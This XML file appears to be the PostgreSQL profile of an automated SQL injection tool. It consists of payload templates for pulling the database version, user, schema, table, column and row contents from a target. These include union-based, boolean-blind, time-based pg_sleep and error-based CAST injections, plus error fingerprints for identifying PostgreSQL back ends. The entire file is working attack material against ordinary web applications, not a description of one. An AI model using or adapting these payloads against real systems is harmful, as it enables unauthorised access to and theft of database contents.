<?xml version="1.0" encoding="UTF-8"?>
<model>
    <vendor></vendor>
    <resource>
        <info>
concat_ws(
    '${ENCLOSE_VALUE_SQL}',
    version(),
    current_database(),
    user
)
|| '${TRAIL_SQL}'
        </info>
        <schema>
            <database>
select 
    array_to_string(
        array(
            select 
                '${ENCLOSE_VALUE_SQL}'
                || r
                || '${SEPARATOR_QTE_SQL}'
                || q::text
                || '${ENCLOSE_VALUE_SQL}'
            from (
                SELECT
                    tables.table_schema r,
                    count(table_name) q
                FROM information_schema.tables
                group by r
                order by r
                {limit}
            ) x
        ),
        '${SEPARATOR_CELL_SQL}'
    )
    || '${TRAIL_SQL}'
            </database>
            <table>
select 
    array_to_string(
        array(
            select 
                '${ENCLOSE_VALUE_SQL}'
                || r
                || '${SEPARATOR_QTE_SQL}'
                || q::text
                || '${ENCLOSE_VALUE_SQL}'
            from (
                SELECT 
                    tables.table_name r,
                    '0' q
                FROM information_schema.tables
                where tables.TABLE_SCHEMA = '${DATABASE}'
                order by r
                {limit}
            ) x
        ),
        '${SEPARATOR_CELL_SQL}'
    )
    || '${TRAIL_SQL}'
            </table>
            <column>
select 
    array_to_string(
        array(
            select 
                '${ENCLOSE_VALUE_SQL}'
                || r
                || '${SEPARATOR_QTE_SQL}'
                || q::text
                || '${ENCLOSE_VALUE_SQL}'
            from (
                SELECT 
                    columns.column_name r, 
                    '0' q
                FROM information_schema.columns
                where columns.TABLE_SCHEMA = '${DATABASE}'
                and columns.TABLE_name = '${TABLE}'
                order by r
                {limit}
            )x
        ),
        '${SEPARATOR_CELL_SQL}'
    )
    || '${TRAIL_SQL}'
            </column>
            <row>
                <query>
select 
    array_to_string(
        array(
            select 
                '${ENCLOSE_VALUE_SQL}'
                || r
                || '${SEPARATOR_QTE_SQL}'
                || q::text
                || '${ENCLOSE_VALUE_SQL}'
            from (
                SELECT 
                    substr((${FIELDS}), 1, 775) r,
                    count(*) q
                FROM ${DATABASE}.${TABLE}
                group by r
                {limit}
            )x
        ),
        '${SEPARATOR_CELL_SQL}'
    )
    || '${TRAIL_SQL}'
                </query>
                <fields>
                <field>trim(coalesce(${FIELD}::text, ''))</field>
                <concat>|| '%7f' ||</concat>
                </fields>
            </row>
        </schema>
    </resource>
    <strategy>
        <configuration>
            <slidingWindow>
select
    /**
     * If reach end of string (${LEAD}i) then NULLIF nullifies the result
     */
    '${LEAD}'
    || NULLIF(
        substr(
            (${INJECTION}),
            ${INDEX},
            65536
        ),
        '${TRAIL_SQL}'
    )
            </slidingWindow>
            <limit>limit 65536 offset ${LIMIT}</limit>
            <failsafe>(1337${INDICE}7330%2b1)::text</failsafe>
            <calibrator>repeat(chr(35), 1024)</calibrator>
            <limitBoundary>0</limitBoundary>
            <endingComment>--+</endingComment>
            <fingerprint>
                <!-- jdbc -->
                <errorMessage>ERROR: unterminated quoted identifier at or near</errorMessage>
                <!-- php -->
                <errorMessage>Query failed: ERROR:  unterminated quoted string at or near</errorMessage>
                <!-- php -->
                <errorMessage>function\\.pg</errorMessage>
                <errorMessage>PostgreSQL</errorMessage>
            </fingerprint>
        </configuration>
        <normal>
            <indices>union select ${INDICES}</indices>
            <capacity>(select '${LEAD}' || ${INDICE} || ${CALIBRATOR})</capacity>
            <orderBy>order by 1337</orderBy>
        </normal>
        <boolean>
            <test>
                <false>true = false</false>
                <false>true %21= true</false>
                <false>false %21= false</false>
                <false>1 = 2</false>
                <false>1 %21= 1</false>
                <false>2 %21= 2</false>
                <true>true = true</true>
                <true>false = false</true>
                <true>true %21= false</true>
                <true>1 = 1</true>
                <true>2 = 2</true>
                <true>1 %21= 2</true>
                <initialization>0%2b1 = 1</initialization>
                <bit><![CDATA[
/**
 * true bit return bit, false bit return 0
 * 8 & 8 = 8, 8 & 4 = 0
 */
0 != (
    ascii(
        substr(
            (${INJECTION}), 
            ${INDEX}, 
            1
        )
    ) 
    %26 ${BIT}
)
                ]]></bit>
                <length>char_length((${INJECTION})) > ${INDEX}</length>
            </test>
            <blind>and ${TEST}</blind>
            <time>
and ''='' 
|| (
    select 
        CASE WHEN ${TEST} 
        THEN '' 
        else pg_sleep(${SLEEP_TIME}) 
    END
)
            </time>
        </boolean>
        <error>
            <method>
                <name>CAST::text_numeric</name>
                <query>
/* Require FALSE statement, then OR */
and 1 = 0 
or 1 = CAST(
    (${WINDOW})::text 
    AS NUMERIC
)
                </query>
                <capacity>255</capacity>
            </method>
        </error>
    </strategy>
</model>